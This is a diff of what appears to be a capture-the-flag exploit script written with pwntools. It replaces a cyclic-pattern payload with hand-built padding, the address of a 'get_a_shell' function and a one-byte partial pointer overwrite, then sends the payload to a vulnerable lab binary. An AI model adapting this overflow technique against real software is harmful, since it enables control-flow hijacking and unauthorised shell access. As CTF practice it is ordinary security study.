@@ -28,9 +28,12 @@ else:
 # BEGIN CHALLENGE-SPECIFIC CODE
 get_a_shell = p64(elf.symbols["get_a_shell"])
 
-max_len = 0x129
+max_len = 129
+offset = 0x20 - 0x40
 
-payload = cyclic(max_len).replace(b"iaaajaaa", get_a_shell)
+print(buffer_address)
+payload = b"a" * 8 + get_a_shell + (max_len - 16 - 1) * b"a" + p64(buffer_address + offset)[0:1]
+
 io.sendline(payload)
 
 # END CHALLENGE-SPECIFIC CODE
